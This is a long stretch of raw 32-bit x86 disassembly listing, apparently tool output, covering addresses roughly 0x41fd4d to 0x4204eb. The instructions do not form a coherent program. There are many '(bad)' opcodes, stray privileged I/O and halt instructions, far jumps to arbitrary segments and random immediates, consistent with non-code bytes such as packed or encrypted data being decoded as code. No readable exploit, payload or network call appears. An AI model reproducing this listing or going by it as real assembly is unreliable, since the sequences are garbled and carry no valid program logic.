  41fd4d:	jbe    0x41fd34
  41fd4f:	ficom  WORD PTR [edx+0x3e]
  41fd52:	out    0x35,eax
  41fd54:	and    eax,0x48934760
  41fd59:	adc    al,0xd4
  41fd5b:	push   cs
  41fd5c:	pop    ds
  41fd5d:	cld    
  41fd5e:	or     eax,0x1eb4a30d
  41fd63:	xlat   BYTE PTR ds:[ebx]
  41fd64:	push   edi
  41fd65:	jo     0x41fcf0
  41fd67:	pop    es
  41fd68:	addr16 je 0x41fde6
  41fd6b:	mov    ch,0x1c
  41fd6d:	push   es
  41fd6e:	aaa    
  41fd6f:	ret    0x6975
  41fd72:	jbe    0x41fd4f
  41fd74:	out    0xca,al
  41fd76:	mov    bl,BYTE PTR [edi+0x36]
  41fd79:	sub    esi,esi
  41fd7b:	(bad)
  41fd7f:	jmp    0xbe5c:0x4aebc0e2
  41fd86:	mul    DWORD PTR ds:0x1d781c6
  41fd8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd8d:	cdq    
  41fd8e:	adc    al,0xf6
  41fd90:	pusha  
  41fd91:	aaa    
  41fd92:	xchg   ah,ch
  41fd94:	jmp    0xdb0d5df1
  41fd99:	pop    ebp
  41fd9a:	mov    al,ds:0x5658cba3
  41fd9f:	jg     0x41fdbc
  41fda1:	cmp    eax,edi
  41fda3:	mov    DWORD PTR [edx-0x72],0x9cd9ce9a
  41fdaa:	test   BYTE PTR ds:0xb788236f,0x78
  41fdb1:	fcmovne st,st(7)
  41fdb3:	out    dx,al
  41fdb4:	hlt    
  41fdb5:	jno    0x41fda0
  41fdb7:	pop    ebx
  41fdb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdb9:	add    eax,0x3d3c0cfb
  41fdbe:	out    0xc3,eax
  41fdc0:	loopne 0x41fdfc
  41fdc2:	xchg   edx,eax
  41fdc3:	sbb    dl,BYTE PTR [ebx]
  41fdc5:	adc    ebp,ebp
  41fdc7:	mov    al,ds:0x23de9cd2
  41fdcc:	sbb    edi,DWORD PTR [eax+0x3a091d67]
  41fdd2:	js     0x41fe10
  41fdd4:	dec    ebp
  41fdd5:	jl     0x41fddc
  41fdd7:	adc    dl,BYTE PTR [esi+0x1b]
  41fdda:	xlat   BYTE PTR ds:[ebx]
  41fddb:	jl     0x41fe2d
  41fddd:	xchg   ebx,eax
  41fdde:	xor    al,BYTE PTR [edx+0x6a]
  41fde1:	popf   
  41fde2:	loope  0x41fe60
  41fde4:	in     eax,dx
  41fde5:	and    cl,BYTE PTR [esi-0x274142d7]
  41fdeb:	pop    eax
  41fdec:	rol    ecx,1
  41fdee:	dec    ebp
  41fdef:	or     ebp,DWORD PTR [eax+0x47]
  41fdf2:	das    
  41fdf3:	je     0x41fdaa
  41fdf5:	stos   DWORD PTR es:[edi],eax
  41fdf6:	mov    eax,ds:0x38c11687
  41fdfb:	adc    BYTE PTR [ecx+eiz*1+0x1045b8dc],cl
  41fe02:	sub    DWORD PTR [ebx-0x3147468a],ecx
  41fe08:	fistp  DWORD PTR [eax-0x31960312]
  41fe0e:	imul   eax,DWORD PTR [ebx],0xc0662a54
  41fe14:	ret    0xa74d
  41fe17:	shl    DWORD PTR [edi],0x58
  41fe1a:	xchg   esp,eax
  41fe1b:	or     BYTE PTR [edx+0x6e5cdac1],ch
  41fe21:	or     esi,eax
  41fe23:	icebp  
  41fe24:	fmul   QWORD PTR [eax]
  41fe26:	pushf  
  41fe27:	xchg   ecx,esi
  41fe29:	xchg   edx,eax
  41fe2a:	and    bl,BYTE PTR [esi+0x23]
  41fe2d:	test   eax,0x3ce31a5b
  41fe32:	push   esp
  41fe33:	mov    ds:0x212656b,al
  41fe38:	imul   esp,DWORD PTR [ecx],0xfb300e75
  41fe3e:	out    dx,al
  41fe3f:	xor    BYTE PTR ds:0x81b4c387,dl
  41fe45:	sbb    al,bl
  41fe47:	inc    esp
  41fe48:	add    al,0x6f
  41fe4a:	mov    eax,ds:0x7d1ba735
  41fe4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe50:	ins    BYTE PTR es:[edi],dx
  41fe51:	lods   eax,DWORD PTR ds:[esi]
  41fe52:	adc    al,0x25
  41fe54:	nop
  41fe55:	cmc    
  41fe56:	cmp    DWORD PTR gs:[esi],ecx
  41fe59:	mov    eax,ds:0x3f2000df
  41fe5e:	sub    al,0x14
  41fe60:	dec    eax
  41fe61:	call   0x85b2:0xaeb1cd22
  41fe68:	ins    BYTE PTR es:[edi],dx
  41fe69:	cld    
  41fe6a:	dec    ebp
  41fe6b:	jbe    0x41fe46
  41fe6d:	xor    esp,DWORD PTR [ebx+edi*2+0x75]
  41fe71:	push   0x53bbdf0b
  41fe76:	lods   al,BYTE PTR ds:[esi]
  41fe77:	fidivr DWORD PTR [edx-0xf]
  41fe7a:	dec    ebx
  41fe7b:	cmp    eax,DWORD PTR [eax-0x7e]
  41fe7e:	xor    DWORD PTR [ebp+0x27bf6f46],eax
  41fe84:	out    0x50,eax
  41fe86:	add    BYTE PTR ds:0x9c44783,bl
  41fe8c:	mov    edi,0x1350f21d
  41fe91:	push   esi
  41fe92:	stos   DWORD PTR es:[edi],eax
  41fe93:	push   edi
  41fe94:	xor    eax,0x1deda598
  41fe99:	test   BYTE PTR gs:[ebx-0x57078d64],dh
  41fea0:	in     al,0x68
  41fea2:	ret    0x3229
  41fea5:	mov    ch,0x38
  41fea7:	iret   
  41fea8:	addr16 push esi
  41feaa:	cmp    DWORD PTR [esi+0x5f53959a],ebx
  41feb0:	cmp    edi,edi
  41feb2:	xchg   edx,eax
  41feb3:	and    DWORD PTR [edx-0x6e76375d],esp
  41feb9:	mov    dh,0xc
  41febb:	sbb    DWORD PTR [esi-0x61],esi
  41febe:	push   ebp
  41febf:	ja     0x41fe5e
  41fec1:	pop    ecx
  41fec2:	dec    ecx
  41fec3:	call   0x374d9ae6
  41fec8:	arpl   WORD PTR [esi],si
  41feca:	ins    DWORD PTR es:[edi],dx
  41fecb:	jp     0x41ff0c
  41fecd:	xchg   edx,eax
  41fece:	aaa    
  41fecf:	add    eax,DWORD PTR [edi+ebx*8]
  41fed2:	xor    ah,dl
  41fed4:	add    esp,ebx
  41fed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fed7:	ret    
  41fed8:	out    dx,al
  41fed9:	jmp    0x1fa1:0xa876e600
  41fee0:	sub    ecx,DWORD PTR [ecx]
  41fee2:	jle    0x41feee
  41fee4:	ins    BYTE PTR es:[edi],dx
  41fee5:	ds xchg esp,eax
  41fee7:	lods   eax,DWORD PTR ds:[esi]
  41fee8:	sbb    bh,bl
  41feea:	aaa    
  41feeb:	icebp  
  41feec:	fdiv   DWORD PTR [esi+edi*1]
  41feef:	sbb    bh,bh
  41fef1:	div    BYTE PTR [ebx-0x52]
  41fef4:	(bad)  
  41fef5:	pop    ebx
  41fef6:	push   ebp
  41fef7:	pop    edx
  41fef8:	call   0xf563717
  41fefd:	jae    0x41feb6
  41feff:	push   ss
  41ff00:	xor    DWORD PTR [edi+ebx*2+0x62c9f41b],ebx
  41ff07:	cmp    ah,BYTE PTR [eax-0x29]
  41ff0a:	into   
  41ff0b:	in     eax,0x11
  41ff0d:	stos   BYTE PTR es:[edi],al
  41ff0e:	loopne 0x41ff3d
  41ff10:	mov    edi,0x80a1a056
  41ff15:	jle    0x41ff0f
  41ff17:	push   0xd1b0dfff
  41ff1c:	mov    esi,cs
  41ff1e:	mov    cl,BYTE PTR [eax-0x6ad8a51e]
  41ff24:	gs pop esi
  41ff26:	dec    esi
  41ff27:	leave  
  41ff28:	pop    edi
  41ff29:	adc    ecx,eax
  41ff2b:	leave  
  41ff2c:	xchg   edi,eax
  41ff2d:	or     BYTE PTR [ebx-0x7fb797f],ch
  41ff33:	(bad)  
  41ff34:	xor    eax,DWORD PTR [edi-0x54]
  41ff37:	jno    0x41ff16
  41ff39:	(bad)
  41ff3d:	rol    BYTE PTR [ecx],1
  41ff3f:	ja     0x41ff77
  41ff41:	mov    al,ds:0x1adf32de
  41ff46:	ja     0x41ff90
  41ff48:	pop    esp
  41ff49:	pusha  
  41ff4a:	or     DWORD PTR [esi+0xb23e8be],ecx
  41ff50:	adc    al,0xd
  41ff52:	lds    ecx,FWORD PTR [eax-0x7880c94b]
  41ff58:	pop    ebx
  41ff59:	lea    esp,[edx]
  41ff5b:	or     eax,0xcce0772a
  41ff60:	retf   0xb93
  41ff63:	clc    
  41ff64:	outs   dx,DWORD PTR ds:[esi]
  41ff65:	scas   eax,DWORD PTR es:[edi]
  41ff66:	clc    
  41ff67:	pop    ebx
  41ff68:	pop    esp
  41ff69:	push   ecx
  41ff6a:	cdq    
  41ff6b:	mov    esi,0x7979ffb8
  41ff70:	scas   eax,DWORD PTR es:[edi]
  41ff71:	rcl    BYTE PTR ds:0xd23bae99,0x79
  41ff78:	sub    esi,DWORD PTR [ecx+ebp*4-0x5]
  41ff7c:	mov    WORD PTR [ebp+0x7f6a226],ss
  41ff82:	inc    edx
  41ff83:	es ins BYTE PTR es:[edi],dx
  41ff85:	popf   
  41ff86:	fs jge 0x41ff1e
  41ff89:	mov    eax,ds:0x2ca708bf
  41ff8e:	imul   DWORD PTR [ebx]
  41ff90:	push   esi
  41ff91:	dec    esi
  41ff92:	mov    cl,0xe8
  41ff94:	xchg   ebx,eax
  41ff95:	sub    ebx,DWORD PTR [edx-0x6a2a83c2]
  41ff9b:	jmp    0x41ff3d
  41ff9d:	mov    ecx,0xf02fb8fa
  41ffa2:	int3   
  41ffa3:	adc    eax,0x43dc8964
  41ffa8:	and    ecx,DWORD PTR [edx-0x30b1c489]
  41ffae:	mov    eax,0x83b481de
  41ffb3:	enter  0x9f69,0xb1
  41ffb7:	inc    esp
  41ffb8:	or     BYTE PTR fs:[eax+eiz*4],ch
  41ffbc:	ds push 0xffffffc0
  41ffbf:	jns    0x41ff4c
  41ffc1:	lea    edx,[ebx]
  41ffc3:	xor    DWORD PTR [edx-0x1a7943e],esp
  41ffc9:	inc    ecx
  41ffca:	in     eax,dx
  41ffcb:	pop    edi
  41ffcc:	push   ss
  41ffcd:	adc    bh,BYTE PTR [edx+0x7d]
  41ffd0:	cmp    BYTE PTR [ebx-0xc],bl
  41ffd3:	xchg   BYTE PTR [edi+0x3667906e],bl
  41ffd9:	jne    0x42000e
  41ffdb:	loopne 0x420047
  41ffdd:	fisttp WORD PTR [eax]
  41ffdf:	popa   
  41ffe0:	dec    ebx
  41ffe1:	and    eax,0xb91da0e0
  41ffe6:	lods   eax,DWORD PTR ds:[esi]
  41ffe7:	shr    DWORD PTR ds:0x15418128,cl
  41ffed:	mov    ebx,0x4c4f8f90
  41fff2:	in     al,0x4b
  41fff4:	xchg   BYTE PTR [ebp-0x22],al
  41fff7:	mov    ebx,DWORD PTR [edx]
  41fff9:	sbb    DWORD PTR [ebp+0x29],esp
  41fffc:	pop    ecx
  41fffd:	xchg   esp,eax
  41fffe:	lahf   
  41ffff:	adc    ch,ah
  420001:	cmp    eax,0x4d220d61
  420006:	add    eax,0x536b4376
  42000b:	dec    edx
  42000c:	xchg   eax,ecx
  42000e:	adc    ebp,DWORD PTR [edx+0x5f]
  420011:	mov    ds:0x6012e8ef,al
  420016:	sti    
  420017:	out    dx,eax
  420018:	cli    
  420019:	fsubr  QWORD PTR [edi-0x30]
  42001c:	xchg   ebp,eax
  42001d:	push   ebp
  42001e:	inc    ebx
  42001f:	sbb    BYTE PTR [esi],bl
  420021:	pushf  
  420022:	and    BYTE PTR [edx+eiz*2-0x7c86d70b],ch
  420029:	in     eax,0x64
  42002b:	push   ds
  42002c:	push   es
  42002d:	inc    eax
  42002e:	scas   eax,DWORD PTR es:[edi]
  42002f:	ja     0x4200a1
  420031:	je     0x42004b
  420033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420034:	sub    DWORD PTR [ebx],0x67
  420037:	mov    ds:0xd196733f,eax
  42003c:	ror    edi,1
  42003e:	iret   
  42003f:	push   cs
  420040:	or     ch,bl
  420042:	pusha  
  420043:	jnp    0x42007e
  420045:	in     eax,0xba
  420047:	jmp    0x8a97:0x28faf468
  42004e:	inc    ebx
  42004f:	pop    esp
  420050:	ret    
  420051:	or     DWORD PTR [ecx+0x40aa9ca],ebx
  420057:	scas   al,BYTE PTR es:[edi]
  420058:	mov    edx,0x6e7abd19
  42005d:	fidivr WORD PTR [ebx]
  42005f:	cmp    dl,BYTE PTR [edi-0x2f]
  420062:	and    eax,0xee81971b
  420067:	inc    ebp
  420068:	and    esi,0xd6fbe58d
  42006e:	push   ss
  42006f:	sbb    al,0xec
  420071:	or     bl,BYTE PTR [edx+0x65a9d8ac]
  420077:	imul   edx,DWORD PTR [eax],0x39400271
  42007d:	cmp    al,0x96
  42007f:	or     ebp,DWORD PTR [eax-0x63c06950]
  420085:	mov    ebp,DWORD PTR [ecx-0x15]
  420088:	ins    BYTE PTR es:[edi],dx
  420089:	jecxz  0x4200e8
  42008b:	rcl    BYTE PTR [ebp-0x39c54933],cl
  420091:	mov    ah,0x4a
  420093:	jno    0x420041
  420095:	in     al,dx
  420096:	mov    edi,0x6d5ab12d
  42009b:	test   ebx,edi
  42009d:	fs inc esi
  42009f:	add    DWORD PTR [esi-0x195c177a],eax
  4200a5:	push   es
  4200a6:	lds    ecx,FWORD PTR [ebx]
  4200a8:	div    DWORD PTR [edx]
  4200aa:	(bad)  
  4200ab:	xchg   edx,eax
  4200ac:	ret    0x8805
  4200af:	mov    DWORD PTR [edx-0x12d6e00d],ebx
  4200b5:	icebp  
  4200b6:	mov    ecx,0x3f73a465
  4200bb:	cmp    eax,0x2bf2a39b
  4200c0:	mov    dl,0xf0
  4200c2:	mov    ds:0x272ca7fe,al
  4200c7:	add    DWORD PTR [ebp+esi*2-0x22bf6cd4],esi
  4200ce:	xchg   esp,eax
  4200cf:	pop    edx
  4200d0:	mov    bh,0xd2
  4200d2:	fsubr  DWORD PTR [ebx]
  4200d4:	cmp    ebx,DWORD PTR [ecx]
  4200d6:	pop    edi
  4200d7:	clc    
  4200d8:	jnp    0x42008c
  4200da:	mov    eax,ds:0xe2d83dec
  4200df:	inc    edx
  4200e0:	ja     0x420079
  4200e2:	sbb    eax,0xfbf6d4db
  4200e7:	mov    ds:0x207edaf7,eax
  4200ec:	pop    DWORD PTR [esp+edi*2+0x2ee676ed]
  4200f3:	test   BYTE PTR [ebx+0x5ee48b8a],0xd0
  4200fa:	xchg   edx,eax
  4200fb:	add    bl,BYTE PTR [ebx+0x2f399f31]
  420101:	cmp    ecx,DWORD PTR [esi-0x347cf366]
  420107:	test   BYTE PTR [eax],bl
  420109:	lods   eax,DWORD PTR ds:[esi]
  42010a:	push   0x68456107
  42010f:	cmp    BYTE PTR [edx],0xe8
  420112:	add    DWORD PTR [eax-0x40],ecx
  420115:	add    esi,DWORD PTR [ebp+0x65]
  420118:	ss mov bl,0x88
  42011b:	dec    eax
  42011c:	pop    edi
  42011d:	imul   ebx,DWORD PTR [esi+0x22f43c95],0xffffffc9
  420124:	nop
  420125:	sbb    BYTE PTR [eax],ch
  420127:	ins    BYTE PTR es:[di],dx
  420129:	pop    edx
  42012a:	xor    eax,0x5c7d3bde
  42012f:	push   0xffffffd7
  420131:	(bad)  
  420132:	cli    
  420133:	fild   DWORD PTR [esi]
  420135:	jecxz  0x4200eb
  420137:	pop    esp
  420138:	mov    al,0xdc
  42013a:	xor    BYTE PTR [edi+0x7f],ah
  42013d:	xchg   ecx,eax
  42013e:	ret    0x1b2e
  420141:	and    ah,BYTE PTR [ecx-0x18432151]
  420147:	inc    edi
  420148:	add    DWORD PTR [eax-0x6d],ebx
  42014b:	sahf   
  42014c:	inc    eax
  42014d:	dec    ebp
  42014e:	or     al,0x86
  420150:	test   eax,0x45d1cdee
  420155:	fisttp QWORD PTR [edi-0x3d7e1efd]
  42015b:	cmp    bh,BYTE PTR [ebp+0x3a]
  42015e:	dec    ecx
  42015f:	cmc    
  420160:	and    al,0xb4
  420162:	iret   
  420163:	push   ds
  420164:	mov    al,ds:0x19cd1668
  420169:	mov    dl,0xab
  42016b:	jge    0x42018d
  42016d:	add    ah,BYTE PTR [ebx-0x319441be]
  420173:	push   cs
  420174:	stos   BYTE PTR es:[edi],al
  420175:	clc    
  420176:	inc    esi
  420177:	pop    ss
  420178:	add    esp,DWORD PTR [esi]
  42017a:	dec    esp
  42017b:	out    dx,eax
  42017c:	aad    0xfc
  42017e:	shl    BYTE PTR [edx+0x49536c0e],cl
  420184:	push   edi
  420185:	es scas eax,DWORD PTR es:[edi]
  420187:	cli    
  420188:	enter  0xacc3,0x52
  42018c:	push   0x25269796
  420191:	jecxz  0x4201e0
  420193:	lea    edx,[edx-0x46]
  420196:	aad    0x82
  420198:	dec    esi
  420199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42019a:	add    al,0xc5
  42019c:	jp     0x42015e
  42019e:	adc    cl,ah
  4201a0:	adc    eax,0x84390886
  4201a5:	push   0x47
  4201a7:	sbb    eax,0xe291c995
  4201ac:	in     al,dx
  4201ad:	test   eax,0xa2b2c1f9
  4201b2:	push   ebp
  4201b3:	mov    WORD PTR [ebx+0x3da93e2b],fs
  4201b9:	sub    BYTE PTR [eax+ebp*8+0x26],al
  4201bd:	in     eax,0x78
  4201bf:	stc    
  4201c0:	jle    0x420226
  4201c2:	jle    0x420171
  4201c4:	mov    edi,0x4056e24f
  4201c9:	xor    DWORD PTR [esi+esi*2-0x5e],esi
  4201cd:	gs addr16 sub eax,0x4ffb0fea
  4201d4:	add    al,0x7c
  4201d6:	sbb    eax,0x947e1790
  4201db:	imul   edi,DWORD PTR [ecx+0x7d],0xc6a8bc2d
  4201e2:	xor    al,al
  4201e4:	ret    0x3419
  4201e7:	push   ds
  4201e8:	add    al,0xd5
  4201ea:	lea    ebx,[ebx]
  4201ec:	push   es
  4201ed:	xchg   ebx,eax
  4201ee:	xchg   eax,esi
  4201f0:	dec    edx
  4201f1:	mov    dl,0xd4
  4201f3:	popa   
  4201f4:	pushf  
  4201f5:	dec    esi
  4201f6:	mov    dh,0x85
  4201f8:	mov    BYTE PTR [edx+ecx*2-0x7657545d],ch
  4201ff:	outs   dx,DWORD PTR ds:[esi]
  420200:	and    al,0xcb
  420202:	mov    dh,0x5c
  420204:	inc    ecx
  420205:	mov    bl,0xf6
  420207:	(bad)  
  420209:	mov    edi,0x675efccb
  42020e:	(bad)  
  42020f:	loopne 0x4201f1
  420211:	ret    0xabb3
  420214:	dec    ebx
  420215:	sub    edi,esp
  420217:	mov    eax,ds:0xbeda08b
  42021c:	int    0x78
  42021e:	stos   DWORD PTR es:[edi],eax
  42021f:	aas    
  420220:	loop   0x42021b
  420222:	aaa    
  420223:	(bad)  [eax+0x348f4f]
  420229:	bound  esp,QWORD PTR [esi+eax*4-0x25]
  42022d:	adc    BYTE PTR [ebx-0x33],0x26
  420231:	das    
  420232:	fisub  WORD PTR [ecx-0x64]
  420235:	fild   WORD PTR [ebp+0x27]
  420238:	hlt    
  420239:	xchg   DWORD PTR [ebx-0x14],ebp
  42023c:	loop   0x420293
  42023e:	dec    ebp
  42023f:	add    BYTE PTR [edx-0x3be173ad],cl
  420245:	mov    WORD PTR [esi],?
  420247:	cmp    ebx,DWORD PTR [edi]
  420249:	dec    ecx
  42024a:	shr    DWORD PTR [edi],cl
  42024c:	push   ss
  42024d:	mov    ?,esi
  42024f:	xor    DWORD PTR [edi-0x10],esi
  420252:	jne    0x4201fd
  420254:	clc    
  420255:	(bad)  
  420256:	sbb    ecx,DWORD PTR [esi+esi*1-0xa]
  42025a:	jg     0x420285
  42025c:	ja     0x42027c
  42025e:	mov    ebp,0xc9ffb39d
  420263:	ins    DWORD PTR es:[edi],dx
  420264:	sbb    DWORD PTR [edi],esi
  420266:	call   0x36d0:0xc37cb7cd
  42026d:	mov    WORD PTR [eax],?
  42026f:	rcl    BYTE PTR [esi],1
  420271:	sbb    al,0x75
  420273:	add    eax,0xa1db8d5e
  420278:	and    eax,0x2272fece
  42027d:	lea    ebx,[ebx+0x3c]
  420280:	fwait
  420281:	adc    BYTE PTR [edx+0x62],ah
  420284:	dec    ebp
  420285:	rcl    DWORD PTR [esi],1
  420287:	jecxz  0x4202de
  420289:	addr16 dec eax
  42028b:	mov    ds:0x9f3edf20,al
  420290:	dec    edi
  420291:	dec    edx
  420292:	lahf   
  420293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420294:	inc    edx
  420295:	xchg   esp,eax
  420296:	jp     0x4202f4
  420298:	fiadd  WORD PTR [esi+0x5342b0e6]
  42029e:	out    0xe1,eax
  4202a0:	repnz mov bl,0x4e
  4202a3:	popa   
  4202a4:	lods   eax,DWORD PTR ds:[esi]
  4202a5:	loope  0x4202ed
  4202a7:	ret    
  4202a8:	jecxz  0x4202b9
  4202aa:	je     0x420329
  4202ac:	add    esp,DWORD PTR [ebx-0x52]
  4202af:	xchg   ebp,eax
  4202b0:	cmp    BYTE PTR [esi-0x1b31462e],cl
  4202b6:	mov    bl,0x43
  4202b8:	xor    DWORD PTR [ebx+0x5c],edi
  4202bb:	mov    eax,0x3fc9020
  4202c0:	iret   
  4202c1:	jmp    0x42025d
  4202c3:	(bad)  cs:[edx-0x121a006f]
  4202ca:	xor    BYTE PTR [ecx-0x7b],bl
  4202cd:	scas   eax,DWORD PTR es:[edi]
  4202ce:	mov    ah,0x1c
  4202d0:	xor    al,0xfe
  4202d2:	cmp    edi,ecx
  4202d4:	ins    BYTE PTR es:[edi],dx
  4202d5:	adc    al,0x98
  4202d7:	xchg   ecx,eax
  4202d8:	verr   WORD PTR [edi]
  4202db:	push   es
  4202dc:	mov    al,0x82
  4202de:	add    al,0x83
  4202e0:	daa    
  4202e1:	mov    ebp,0xb4c6f4e4
  4202e6:	stos   DWORD PTR es:[edi],eax
  4202e7:	inc    eax
  4202e8:	ins    DWORD PTR es:[edi],dx
  4202e9:	inc    ebp
  4202ea:	(bad)  
  4202eb:	lods   eax,DWORD PTR ds:[esi]
  4202ec:	imul   esi,ebp,0x65
  4202ef:	push   0xffffffbc
  4202f1:	sti    
  4202f2:	jnp    0x4202a3
  4202f4:	or     al,0xec
  4202f6:	(bad)  
  4202f7:	fst    QWORD PTR [esi-0x6e]
  4202fa:	add    dh,BYTE PTR es:[ecx]
  4202fd:	and    esi,esi
  4202ff:	iret   
  420300:	into   
  420301:	xor    DWORD PTR [ecx],esi
  420303:	pushf  
  420304:	push   edi
  420305:	dec    esi
  420306:	mov    bl,BYTE PTR [ebx]
  420308:	xor    eax,0x5eb9d8d2
  42030d:	into   
  42030e:	jnp    0x42032b
  420310:	pop    ss
  420311:	mov    ebx,0x86b86a52
  420316:	ins    BYTE PTR es:[edi],dx
  420317:	xchg   BYTE PTR [ecx-0xd1ac8cc],al
  42031d:	stos   BYTE PTR es:[edi],al
  42031e:	and    al,0x9a
  420320:	out    0x97,eax
  420322:	(bad)  
  420323:	sub    eax,0x417bd7a4
  420328:	mov    DWORD PTR [edi-0x2801bf48],eax
  42032e:	xchg   BYTE PTR [esp+edi*8+0x7b4de7e],dh
  420335:	dec    ecx
  420336:	add    DWORD PTR [esp+edi*2],esp
  420339:	int    0x9e
  42033b:	ins    DWORD PTR es:[edi],dx
  42033c:	push   ss
  42033d:	xchg   edx,eax
  42033e:	mov    eax,0xcaceedda
  420343:	inc    ebp
  420344:	mov    ds:0xee24878a,al
  420349:	pop    edi
  42034a:	push   0x55
  42034c:	shr    al,0xe4
  42034f:	jo     0x42030d
  420351:	ss (bad) 
  420353:	push   ss
  420354:	test   DWORD PTR [eax],edi
  420356:	fsub   DWORD PTR [edi+0x38]
  420359:	dec    ebx
  42035a:	aam    0x52
  42035c:	cwde   
  42035d:	xchg   ecx,eax
  42035e:	loop   0x4202ff
  420360:	out    0x8b,al
  420362:	cmp    BYTE PTR [ebp-0x677efd0b],ah
  420368:	rcl    BYTE PTR [ebp+esi*8-0xd],0xc0
  42036d:	xchg   esi,eax
  42036e:	add    BYTE PTR [edx-0x1b],0xb0
  420372:	mov    ss:0xd6808331,eax
  420378:	clc    
  420379:	mov    ebp,0x886e735b
  42037e:	in     eax,0x63
  420380:	xchg   ecx,eax
  420381:	daa    
  420382:	mov    eax,0x2541749e
  420387:	fmulp  st(2),st
  420389:	push   edi
  42038a:	adc    al,BYTE PTR [ebp+esi*4-0x78f1fe9b]
  420391:	imul   edx,DWORD PTR [eax-0x6799d973],0x383e1d70
  42039b:	gs std 
  42039d:	sbb    edi,DWORD PTR [ebx+0x26]
  4203a0:	in     eax,0xfe
  4203a2:	pop    ss
  4203a3:	rol    BYTE PTR [ebx],0xe0
  4203a6:	push   cs
  4203a7:	hlt    
  4203a8:	call   FWORD PTR [ecx]
  4203aa:	xor    BYTE PTR [esi-0x377365e3],bl
  4203b0:	cmp    eax,0xb5f6c2c3
  4203b5:	pop    edx
  4203b6:	mov    edx,esi
  4203b8:	scas   al,BYTE PTR es:[edi]
  4203b9:	jl     0x4203c0
  4203bb:	pop    es
  4203bc:	nop
  4203bd:	jae    0x420422
  4203bf:	fisttp WORD PTR [edx+0x7247779b]
  4203c5:	push   edx
  4203c6:	cli    
  4203c7:	je     0x4203ed
  4203c9:	pop    ebp
  4203ca:	ja     0x4203a1
  4203cc:	dec    eax
  4203cd:	into   
  4203ce:	and    cl,BYTE PTR [edx-0x5d7874c4]
  4203d4:	fisttp QWORD PTR [ebp-0x12cb531e]
  4203da:	mov    edi,0x95b5617a
  4203df:	in     eax,0xbb
  4203e1:	push   ss
  4203e2:	jmp    0x4203ec
  4203e4:	mov    BYTE PTR [ebx+0x7504e540],dh
  4203ea:	pop    ebp
  4203eb:	cmp    al,0x22
  4203ed:	add    ecx,edi
  4203ef:	out    0xdc,al
  4203f1:	dec    ebp
  4203f2:	fisttp QWORD PTR [esi-0xc]
  4203f5:	(bad)  
  4203f6:	cld    
  4203f7:	inc    bh
  4203f9:	nop
  4203fa:	in     al,0xef
  4203fc:	test   BYTE PTR [ecx-0x4983a6be],0x99
  420403:	inc    edx
  420404:	jns    0x4203c9
  420406:	ds and ebp,esp
  420409:	stos   DWORD PTR es:[edi],eax
  42040a:	xchg   edx,eax
  42040b:	xchg   esp,eax
  42040c:	ror    DWORD PTR [eax-0x25],1
  42040f:	push   esp
  420410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420411:	pop    eax
  420412:	out    dx,eax
  420413:	jmp    0xf83a:0x19418b3e
  42041a:	call   0x782dcaa4
  42041f:	(bad)  
  420420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420421:	add    BYTE PTR [ecx+0x56b9cf5d],cl
  420427:	stos   DWORD PTR es:[edi],eax
  420428:	fadd   DWORD PTR [ecx+0x16]
  42042b:	in     al,dx
  42042c:	sub    al,0xee
  42042e:	arpl   bx,ax
  420430:	sbb    eax,0x68df43e
  420435:	mov    ?,WORD PTR [ebp-0x60d5550f]
  42043b:	and    eax,0xfb962edc
  420440:	or     ecx,DWORD PTR [edx-0x2b5fc3b7]
  420446:	shl    DWORD PTR ds:0x81f44eab,0x9d
  42044d:	fs (bad) 
  420450:	push   0xd18b5b9f
  420455:	aaa    
  420456:	xor    bl,BYTE PTR [ebx]
  420458:	mov    WORD PTR [ecx+ecx*4],ds
  42045b:	pop    ecx
  42045c:	sbb    al,0xc1
  42045e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42045f:	dec    edx
  420460:	inc    cl
  420462:	lahf   
  420463:	ins    BYTE PTR es:[edi],dx
  420464:	imul   edi,ebx,0x21b30f4
  42046a:	test   al,0x9a
  42046c:	pop    ebx
  42046d:	in     al,0xe8
  42046f:	cmc    
  420470:	stos   BYTE PTR es:[edi],al
  420471:	xor    bl,BYTE PTR [ebp-0x374724ce]
  420477:	stc    
  420478:	pop    ebp
  420479:	cld    
  42047a:	jg     0x42047d
  42047c:	jp     0x420436
  42047e:	xor    DWORD PTR [edx],esp
  420480:	sub    ecx,0x17
  420483:	push   cs
  420484:	jge    0x42047a
  420486:	push   edi
  420487:	xchg   ebp,eax
  420488:	adc    eax,0xa02036ed
  42048d:	pop    ebp
  42048e:	or     bl,BYTE PTR [ebx+0x25]
  420491:	xor    al,0xd0
  420493:	inc    edi
  420494:	jae    0x420444
  420496:	dec    ebp
  420497:	dec    edx
  420498:	vaesenclast zmm0{k5}{z},zmm2,QWORD PTR [ebx-0x338]{1to8}
  42049f:	cs cld 
  4204a1:	aad    0x16
  4204a3:	mov    dl,0xb1
  4204a5:	mov    BYTE PTR [edi],ch
  4204a7:	adc    BYTE PTR [eax+0x23e767ab],dh
  4204ad:	and    edx,DWORD PTR [eax+0x66f0729c]
  4204b3:	inc    eax
  4204b4:	push   ds
  4204b5:	shr    esp,0xa
  4204b8:	ins    BYTE PTR es:[edi],dx
  4204b9:	aaa    
  4204ba:	lock xchg edx,eax
  4204bc:	aas    
  4204bd:	push   cs
  4204be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204bf:	pusha  
  4204c0:	mov    ds,WORD PTR [ecx-0x700dd9a4]
  4204c6:	and    ecx,DWORD PTR [edi-0x49aac129]
  4204cc:	ficomp WORD PTR [esi+ecx*8]
  4204cf:	fwait
  4204d0:	mov    ah,0xbc
  4204d2:	mov    ebx,eax
  4204d4:	pop    edx
  4204d5:	outs   dx,DWORD PTR ds:[esi]
  4204d6:	push   edx
  4204d7:	jle    0x420464
  4204d9:	test   DWORD PTR [esi+ebp*8],ebp
  4204dc:	or     eax,0xc94d339d
  4204e1:	out    dx,eax
  4204e2:	rcl    DWORD PTR [esi+0x269bb7eb],1
  4204e8:	je     0x4204bd
  4204ea:	dec    esp
  4204eb:	int3   
